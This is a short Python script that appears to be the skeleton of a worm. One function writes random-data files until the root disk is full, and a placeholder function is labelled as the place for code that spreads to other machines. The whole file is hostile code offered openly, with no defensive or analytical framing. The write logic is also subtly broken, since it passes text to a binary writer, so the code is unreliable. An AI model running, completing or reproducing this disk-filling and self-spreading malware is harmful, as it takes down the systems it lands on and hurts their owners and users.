import os
import random
import string
import io

# Function to generate random data
def generate_random_data(size):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

# Function to fill available space on the local machine
def occupy_space():
    available_space = os.statvfs('/').f_frsize * os.statvfs('/').f_bavail
    buffer_size = 1024 * 1024  # 1 MB buffer size
    files_per_batch = 100  # Number of files to create per batch
    data_buffer = generate_random_data(buffer_size)

    while available_space > 0:
        batch_files = []
        for _ in range(files_per_batch):
            # Generate a random filename
            filename = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
            batch_files.append(filename)

        with io.BufferedWriter(io.FileIO(batch_files.pop(), 'w')) as file:
            for _ in range(files_per_batch - 1):
                file.write(data_buffer)

        # Update the available space
        available_space = os.statvfs('/').f_frsize * os.statvfs('/').f_bavail

# Function to initiate the replication process on a new machine
def replicate():
    # Code for spreading to other machines goes here
    pass

# Main execution
if __name__ == '__main__':
    # Occupying space on the local machine
    occupy_space()

    # Initiating replication process
    replicate()
